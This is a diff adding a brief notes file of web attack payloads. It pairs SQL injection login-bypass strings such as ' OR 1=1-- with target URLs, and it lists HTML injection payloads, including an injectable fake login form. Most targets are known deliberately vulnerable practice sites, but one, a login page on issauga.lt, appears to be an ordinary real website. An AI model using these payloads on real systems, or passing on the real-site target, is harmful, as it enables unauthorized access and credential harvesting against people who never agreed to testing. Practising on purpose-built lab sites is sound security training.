@@ -1,0 +1,26 @@
+SQL injection website:
+
+https://issauga.lt/login-1/index.php
+
+Username admin 'OR'1'='1
+Password : random
+OR
+http://testfire.net/
+username: ' OR 1=1--
+Password: random
+
+HTML injection:
+Website: http://testfire.net/ (just type testfire.net)
+
+in the search bar enter : <h1>hello</h1>
+website: http://testphp.vulnweb.com/userinfo.php (type php login test page)
+login using 'test' username and 'test' password and in username section
+enter <a href="https://www.google.com">HTML</a> and update
+creates hyperlink to google
+
+html injection payloads ( enter in search bar of testfire.net website)
+<colgroup><col span="2" style="background-color:red"></colgroup>
+<h1>hello</h1>
+<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
+<button type="button">Click Me!</button> 
+<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>
